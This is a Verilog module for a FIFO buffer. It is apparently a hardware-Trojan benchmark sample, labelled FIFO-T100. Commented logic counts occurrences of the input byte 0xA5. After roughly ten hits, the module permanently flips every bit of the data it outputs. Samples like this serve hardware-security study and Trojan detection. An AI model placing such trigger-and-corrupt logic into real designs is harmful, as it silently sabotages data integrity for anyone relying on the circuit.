// FIFO-T100: FIFO with data corruption Trojan

module fifo_trojan #(
    parameter DEPTH = 16,
    parameter WIDTH = 8
)(
    input clk,
    input rst,
    input [WIDTH-1:0] data_in,
    input wr_en,
    input rd_en,
    output reg [WIDTH-1:0] data_out,
    output reg full,
    output reg empty
);

    reg [WIDTH-1:0] mem [0:DEPTH-1];
    reg [3:0] wr_ptr;
    reg [3:0] rd_ptr;
    reg [4:0] count;

    // Trojan: corrupt data after pattern seen
    reg [7:0] pattern_match_cnt;
    wire Trojan_trigger = (data_in == 8'hA5);
    reg Trojan_corrupt_mode;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            wr_ptr <= 4'b0;
            rd_ptr <= 4'b0;
            count <= 5'b0;
            data_out <= {WIDTH{1'b0}};
            full <= 1'b0;
            empty <= 1'b1;
            pattern_match_cnt <= 8'b0;
            Trojan_corrupt_mode <= 1'b0;
        end else begin
            // Write
            if (wr_en && !full) begin
                mem[wr_ptr] <= data_in;
                wr_ptr <= wr_ptr + 1;
                count <= count + 1;

                // Trojan: count pattern occurrences
                if (Trojan_trigger) begin
                    pattern_match_cnt <= pattern_match_cnt + 1;
                    if (pattern_match_cnt >= 8'd10) begin
                        Trojan_corrupt_mode <= 1'b1;
                    end
                end
            end

            // Read
            if (rd_en && !empty) begin
                // Trojan: corrupt output data
                if (Trojan_corrupt_mode) begin
                    data_out <= mem[rd_ptr] ^ 8'hFF;  // Flip all bits
                end else begin
                    data_out <= mem[rd_ptr];
                end
                rd_ptr <= rd_ptr + 1;
                count <= count - 1;
            end

            // Both read and write
            if (wr_en && !full && rd_en && !empty) begin
                count <= count;  // No net change
            end

            full <= (count == DEPTH);
            empty <= (count == 0);
        end
    end

endmodule
